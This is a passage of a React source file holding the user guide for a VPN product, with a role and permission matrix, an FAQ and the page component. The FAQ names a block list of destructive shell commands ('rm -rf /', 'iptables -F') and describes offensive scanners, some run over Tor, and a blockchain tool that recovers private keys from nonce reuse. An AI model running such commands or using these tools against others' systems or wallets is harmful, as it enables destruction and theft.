            ["security_admin", "text-orange-400", "Full security toolkit: SIEM, audit chain, ZTNA policy, firewall. Can revoke WireGuard configs."],
            ["network_admin", "text-yellow-400", "Node + WireGuard management: add/remove nodes, rotate keys, split tunneling, DNS."],
            ["auditor", "text-blue-400", "Read-only across all security and network data. Can export audit chain and view SIEM events."],
            ["support", "text-cyan-400", "View node status, user config list, and system health. Cannot see keys or audit chain."],
            ["user", "text-green-400", "Can manage their own WireGuard configs and devices only."],
          ].map(([role, color, desc]) => (
            <div key={role} className="flex gap-2 border border-primary/10 rounded px-2 py-1 text-[9px] font-mono">
              <span className={`font-bold w-28 shrink-0 ${color}`}>{role}</span>
              <span className="text-primary/75">{desc}</span>
            </div>
          ))}
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">PERMISSION MATRIX (selected)</div>
        <div className="overflow-x-auto">
          <table className="text-[8px] font-mono w-full border-collapse">
            <thead>
              <tr className="text-primary/60">
                <th className="text-left px-2 py-1 border border-primary/10">Action</th>
                <th className="px-2 py-1 border border-primary/10">owner</th>
                <th className="px-2 py-1 border border-primary/10">sec_admin</th>
                <th className="px-2 py-1 border border-primary/10">net_admin</th>
                <th className="px-2 py-1 border border-primary/10">auditor</th>
                <th className="px-2 py-1 border border-primary/10">support</th>
                <th className="px-2 py-1 border border-primary/10">user</th>
              </tr>
            </thead>
            <tbody>
              {[
                ["admin:write",     "✅","✅","❌","❌","❌","❌"],
                ["vpn:write",       "✅","✅","✅","❌","❌","❌"],
                ["vpn:own_config",  "✅","✅","✅","❌","❌","✅"],
                ["audit:export",    "✅","✅","❌","✅","❌","❌"],
                ["security:write",  "✅","✅","❌","❌","❌","❌"],
                ["users:manage",    "✅","❌","❌","❌","❌","❌"],
              ].map(([action, ...perms]) => (
                <tr key={action} className="border-b border-primary/5">
                  <td className="px-2 py-1 border border-primary/10 text-primary/90">{action}</td>
                  {perms.map((p, i) => (
                    <td key={i} className={`px-2 py-1 text-center border border-primary/10 ${p === "✅" ? "text-green-400" : "text-red-400/60"}`}>{p}</td>
                  ))}
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">ASSIGNING ROLES</div>
        <div className="space-y-2">
          <div className="bg-black/40 rounded p-2 font-mono text-[9px] text-green-300">
            {"-- Via SQL interface (owner only)\nUPDATE users SET role = 'security_admin' WHERE email = 'alice@example.com';"}
          </div>
          <div className="bg-black/40 rounded p-2 font-mono text-[9px] text-green-300">
            {"// Via Admin API (owner only)\nPUT /api/users/:id  { \"role\": \"auditor\" }"}
          </div>
          <p className="text-[9px] font-mono text-primary/70">
            Owner guarantee: accounts listed in the <code>ADMIN_EMAILS</code> env var are always set to <span className="text-red-400">owner</span> regardless of the DB value.
          </p>
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">ENFORCEMENT</div>
        <p className="text-[9px] font-mono text-primary/80">
          Roles are enforced via <code>requirePermission(action)</code> middleware in <code>lib/rbac.ts</code>.
          Every permission denial is logged to the SIEM as a <span className="text-orange-400">rbac.denied</span> event and recorded in the audit chain.
          Unauthorized access attempts are visible in <a href="/siem" className="text-primary hover:underline">/siem</a>.
        </p>

        <div className="border border-yellow-900/40 rounded p-3 bg-yellow-950/20 mt-2">
          <div className="text-[10px] font-mono font-bold text-yellow-400 mb-1">⚠ CURRENT SCOPE</div>
          <p className="text-[9px] font-mono text-primary/80">
            Fine-grained RBAC is currently enforced on ZTNA routes. Most admin routes still use a coarse
            admin check. Full <code>requirePermission()</code> wiring across all admin routes is planned for Q3 2026.
          </p>
        </div>
      </div>
    ),
  },
  {
    id: "platform-faq",
    title: "Frequently Asked Questions",
    icon: BookOpen,
    content: (
      <div className="space-y-3">
        <p>Answers to the most common ProxhqVPN questions. If you don't find your answer here, contact <a href="mailto:support@proxhqvpn.com" className="text-primary hover:underline">support@proxhqvpn.com</a>.</p>
        <div className="space-y-3">
          {[
            { q: "Why is my VPN connection slow?", a: "Try switching to a closer node in WireGuard Config. Check if Obfuscation (Stealth Mode) is enabled — obfuscation adds overhead. Disable DAITA's Constant Bandwidth Mode. Also ensure your ISP isn't throttling UDP (try the TCP-fallback obfuscation method)." },
            { q: "Why does the kill switch block all traffic even when connected?", a: "This usually means the WireGuard tunnel failed to establish but the kill switch pre-emptively activated. Go to Kill Switch → Disarm, reconnect WireGuard, then re-arm. If it persists, check that your WireGuard endpoint IP is correct in the downloaded config." },
            { q: "My IP isn't changing after connecting. What's wrong?", a: "Verify the WireGuard tunnel shows 'Active' (green) in your OS WireGuard app. Check /leaks — if your real IP still shows, the VPN routing isn't applying to your browser. Try toggling the kill switch on/off to force re-routing. On Windows, ensure the AllowedIPs = 0.0.0.0/0 line is in your config." },
            { q: "How do I add ProxhqVPN to a new device?", a: "Go to Device Manager (/devices) → Add Device → enter a name → a new WireGuard keypair and config are generated for that device. Download the config or scan the QR code. Each device gets a unique IP (10.8.0.x/24) and keypair for individual revocation." },
            { q: "Can I use ProxhqVPN with NordVPN/ExpressVPN at the same time?", a: "Yes — use the VPN Coexistence page (/vpn-coexist). It supports fwmark-based routing (parallel tunnels), double-hop mode (ProxhqVPN → Commercial VPN), and network namespace isolation. The auto-detect feature finds which commercial VPN is running and generates the correct coexistence config." },
            { q: "What is the difference between VPN Basic and Command Center Pro?", a: "VPN Basic ($6.99/mo) includes: WireGuard VPN, Kill Switch, Leak Test, DNS Shield, Smart DNS, Network Monitor, DNS Sinkhole, Onion Browser, VPN Gate, Dark Web Monitor, Device Manager, GPS Spoofing, DAITA, Post-Quantum, IP Rotator, Alt Identity, Parrot Tools, Downloads. Command Center Pro ($39.99/mo) adds: all offensive security tools (Alpha Toolkit, HTTP Probe, Intruder, Payload Gen, SQLmap, Directory Fuzzer, Subdomain Scout, CVE Lookup, WAF Analyzer, JWT Analyzer, SQLi Scanner, SSL/TLS Analyzer, SAST, Dependency Scanner, OAST Tester, Token Sequencer, WebSocket Tester, IAC Scanner, HTTP Interceptor, API Tester), defensive tools (SIEM, OSINT Recon, Ghost Trace, Canary Tokens, Ghost Chain, Exploit Importer, Ghost Trap, VPN Tracker, Username Intelligence, Social Breach Tester, Bug Bounty Hub, HackAnon), and QuantumAudit / Sig Miner." },
            { q: "How do I cancel my subscription?", a: "Go to Account & Settings → Billing → Cancel Subscription. Your plan remains active until the end of the current billing period. For refund requests, email support@proxhqvpn.com." },
            { q: "Is ProxhqVPN truly no-log?", a: "The VPN tunnel itself is zero-log — we do not record which websites you visit or which IPs you connect to through the tunnel. We retain: account/billing data (required for subscriptions), the Terminal audit log (admin-only, command history for security), and session metadata (Clerk auth sessions). Our Warrant Canary (/api/warrant-canary) confirms no government surveillance orders have been received." },
            { q: "How do I become an Ambassador?", a: "Navigate to /ambassador/apply and fill out the application form. Choose a promo code, provide your social media handles or YouTube channel, and submit. Approval typically takes 1–3 business days. Once approved, your promo code gives referrals 10% off, and you earn 10% commission on every subscription from your referrals." },
            { q: "How do I use the Alpha Toolkit?", a: "Go to /alpha-tools. Enter the target URL in the Scanner tab. Select the detection profiles (XSS, SQLi, RCE, SSRF, etc.). Enable Tor routing if needed. Click Scan. When a finding shows the htmlReady flag, click Send to Verifier to auto-load the scanner report into the Verifier tab for deep validation. Download the full report as HTML." },
            { q: "How do I read the QuantumAudit Signature Miner results?", a: "Go to /quantum-audit/sig-miner. The Hybrid Engine runs all 4 engines in parallel: Block Scanner (on-chain ECDSA), Web Spider (paste sites/GitHub), OSINT Spider (code search), and Peel Chain (fund-flow). Results are aggregated through the Cross-Engine Pool and deduplicated. Nonce reuse findings include the recovered private key. R-collision findings include the shared nonce value. All results are for authorized blockchain forensic research only." },
            { q: "My Terminal command is blocked. Why?", a: "All Terminal commands run through a strict allowlist. If your command isn't on the allowlist, it will be blocked unless you enable ProxhqVPN Mode (the toggle next to the command input). ProxhqVPN Mode bypasses the allowlist but still enforces the HARD_BLOCKED destructive pattern list (rm -rf /, iptables -F, etc.) and logs every command to the audit trail." },
            { q: "What are RAM-only WireGuard keys and why do they matter?", a: "ProxhqVPN nodes use a Mullvad-style RAM-only key architecture: the server private key is never written to disk. On boot, the node fetches its key from the API (authenticated by a pre-shared secret) and writes it only to /dev/shm/ (volatile RAM). Power-cycling the server permanently destroys the key — a disk image reveals nothing. This protects against cold-boot attacks and physical server seizure." },
            { q: "How do I apply the Node Security Hardening Script?", a: "Go to Firewall → NodeSync tab → find the 'Full Node Security Hardening Script' section → click the download button for your node (Chicago 61 / London 62 / LA 63 / Tokyo 64). Copy the downloaded .sh to your node and run it as root: bash proxhq-hardening-<node>.sh. It installs 9 systemd services including WireGuard-aware iptables, fail2ban, DDoS monitor, ATR watchdog, and firewall sync. The FORWARD chain always accepts WireGuard traffic — no VPN users are affected." },
            { q: "Does ATR (Auto Threat Response) disrupt VPN users?", a: "No. ATR acts only on the INPUT chain perimeter — external attackers, port scanners, and IPS-flagged sources. WireGuard peer traffic enters on the FORWARD chain via wg0, which has an explicit ACCEPT rule that ATR never modifies. VPN users continue passing traffic freely regardless of what the ATR is doing on the perimeter." },
            { q: "How does the Per-WireGuard-Peer firewall work?", a: "In Firewall → Peer Rules tab, enter a WireGuard public key and set action (Allow / Block / Throttle) and direction (any/inbound/outbound). Rules are pushed to each node and applied to the FORWARD chain with iptables -m string matches on the peer's allocated IP (resolved live from wg show allowed-ips). Blocking a peer rule is lighter than removing the WireGuard peer config — you can re-enable it instantly." },
          ].map(({ q, a }) => (
            <div key={q} className="border border-primary/10 rounded px-3 py-3">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">Q: {q}</div>
              <div className="text-[9px] font-mono text-primary/83">A: {a}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
];

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

export default function UserGuide() {
  const [active, setActive] = usePersistedState<string>("userguide-active", "overview");
  const [search, setSearch] = usePersistedState<string>("userguide-search", "");
  const contentRef = useRef<HTMLDivElement>(null);

  const filtered = search
    ? SECTIONS.filter(s =>
        s.title.toLowerCase().includes(search.toLowerCase()) ||
        s.id.toLowerCase().includes(search.toLowerCase())
      )
    : SECTIONS;

  useEffect(() => {
    if (contentRef.current) contentRef.current.scrollTop = 0;
  }, [active]);

  const current = SECTIONS.find(s => s.id === active) ?? SECTIONS[0];

  return (
    <div className="flex gap-0 h-[calc(100vh-4rem)] -mx-6 -my-6 overflow-hidden">
      <PageSEO
        title="User Guide & Documentation — ProxhqVPN"
        description="Complete documentation for ProxhqVPN — WireGuard setup, kill switch, leak testing, router configs, Alpha Toolkit, SilkWeb honeypot, ambassador program, and billing. Self-hosted VPN by ALPHA UNLIMITED TECHNOLOGIES LLC."
        path="/guide"
      />

      {/* Sidebar */}
      <aside className="w-52 shrink-0 border-r border-primary/10 bg-black overflow-y-auto flex flex-col">
        <div className="px-3 py-3 border-b border-primary/10 shrink-0">
          <div className="text-[9px] font-mono font-bold text-primary uppercase tracking-widest mb-2 flex items-center gap-1.5">
            <BookOpen className="w-3 h-3" /> User Guide
          </div>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search docs…"
            className="w-full bg-black border border-primary/15 text-primary text-[9px] font-mono px-2 py-1 focus:outline-none focus:border-primary/40 rounded"
          />
        </div>
        <nav className="flex-1 py-2">
          {filtered.map(s => {
            const Icon = s.icon;
            return (
              <button
                key={s.id}
                onClick={() => { setActive(s.id); setSearch(""); }}
                className={`w-full text-left px-3 py-2 flex items-center gap-2 text-[10px] font-mono transition-colors ${
                  active === s.id
                    ? "bg-primary/10 text-primary border-r-2 border-primary"
                    : "text-primary/78 hover:text-primary hover:bg-primary/5"
                }`}
              >
                <Icon className="w-3 h-3 shrink-0" />
                <span className="truncate">{s.title}</span>
              </button>
            );
          })}
        </nav>
        <div className="px-3 py-3 border-t border-primary/10 shrink-0">
          <div className="text-[8px] font-mono text-primary/83 leading-relaxed">
            ProxhqVPN v3.0<br />
            ALPHA UNLIMITED TECHNOLOGIES LLC<br />
            <a href="mailto:support@proxhqvpn.com" className="text-primary/78 hover:text-primary">support@proxhqvpn.com</a>
          </div>
        </div>
      </aside>

      {/* Content */}
      <div ref={contentRef} className="flex-1 overflow-y-auto">
        <div className="max-w-3xl mx-auto px-6 py-6 space-y-4">
          {/* Header */}
          <div className="flex items-center gap-2 text-[9px] font-mono text-primary/78">
            <BookOpen className="w-3 h-3 text-primary" />
            <ChevronRight className="w-2 h-2" />
            <span className="text-primary">{current.title}</span>
          </div>
          <div className="flex items-start gap-3">
            <div className="w-8 h-8 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0">
              <current.icon className="w-4 h-4 text-primary" />
            </div>
            <div>
              <h1 className="text-lg font-bold text-primary tracking-tight">{current.title}</h1>
              <div className="text-[9px] font-mono text-primary/78">ProxhqVPN Documentation</div>
            </div>
          </div>

          <div className="border-t border-primary/10 pt-4 text-[10px] font-mono text-primary/88 leading-relaxed space-y-2">
            {current.content}
          </div>

          {/* Navigation */}
          <div className="flex items-center justify-between pt-6 border-t border-primary/10">
            {(() => {
              const idx = SECTIONS.findIndex(s => s.id === active);
              const prev = SECTIONS[idx - 1];
              const next = SECTIONS[idx + 1];
              return (
                <>
                  {prev ? (
                    <button onClick={() => setActive(prev.id)}
                      className="flex items-center gap-1 text-[9px] font-mono text-primary/78 hover:text-primary transition-colors">
                      ← {prev.title}
                    </button>
                  ) : <div />}
                  {next ? (
                    <button onClick={() => setActive(next.id)}
                      className="flex items-center gap-1 text-[9px] font-mono text-primary/78 hover:text-primary transition-colors">
                      {next.title} →
                    </button>
                  ) : <div />}
                </>
              );
            })()}
          </div>
        </div>
      </div>
    </div>
  );
}
